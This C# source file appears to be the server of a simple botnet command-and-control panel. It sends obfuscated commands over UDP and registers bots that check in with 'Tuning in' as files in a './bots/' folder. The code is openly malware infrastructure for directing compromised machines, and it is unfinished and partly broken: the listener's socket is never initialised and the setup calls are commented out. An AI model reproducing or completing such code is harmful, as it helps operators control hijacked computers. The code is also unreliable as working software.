using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using Client;
using Client.Commands;
using System.IO;
namespace Server
{
    internal class Program
    {
        private static Socket s;
        static void Main(string[] args)
        {

           
            //Socket s = new Socket(AddressFamily.InterNetworkV6, SocketType.Dgram, ProtocolType.Udp);
            //s.SetSocketOption(SocketOptionLevel.IPv6, SocketOptionName.IPv6Only, false);
            //s.Bind(new IPEndPoint(IPAddress.IPv6Any, 14567));

            //setup();

            //Console.Title= "\t\t\tWelcome to Contro pannael";

            //Console.WriteLine(Console.Title);


            Console.WriteLine("----------------------------------Welcome to Contro pannael-------------------------------------------------------");

            //Task.Factory.StartNew(listen);

        SendCmd:

            SendCmd(Console.ReadLine());
            goto SendCmd;

            Console.ReadKey();
            ;
        }
        public static void SendCmd(string cmd)
        {

            Socket s = new Socket(AddressFamily.InterNetworkV6, SocketType.Dgram, ProtocolType.Udp);
            s.SetSocketOption(SocketOptionLevel.IPv6, SocketOptionName.IPv6Only, false);
            IPEndPoint ipep = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 14568);
            Byte[] data = Encoding.UTF8.GetBytes(cmd.obfuscate());
            s.SendTo(data, ipep);
        }


        public static void listen()
        {
            IPEndPoint ipep = new IPEndPoint(IPAddress.IPv6Any, 0);
            EndPoint ep = ipep as EndPoint;
            Byte[] data = new Byte[65535];
            s.ReceiveFrom(data, ref ep);
            List<Byte> bytes = new List<Byte>(data); // Becuse we dont know the length of the array
            bytes.RemoveAll(b => b == 0); // 65535 is a very large number so it will remove the empty ones
           string str = Encoding.UTF8.GetString(bytes.ToArray()).deobfuscate();
            if (str == "Tuning in")
            {
                string fn = ep.ToString().Replace(':', ';').Replace("[", "").Replace("]", "");
                if (!(File.Exists("./bots/"+ fn)))
                        {
                    File.Create("./bots/" + fn);
                }
            }
            listen(); //recursive function becuse you dont know how many commands will be sent

        }
        public static void setup()
        {
            if (Directory.Exists("./bots/")) return ;
            Directory.CreateDirectory("./bots/");

        }
    }
}
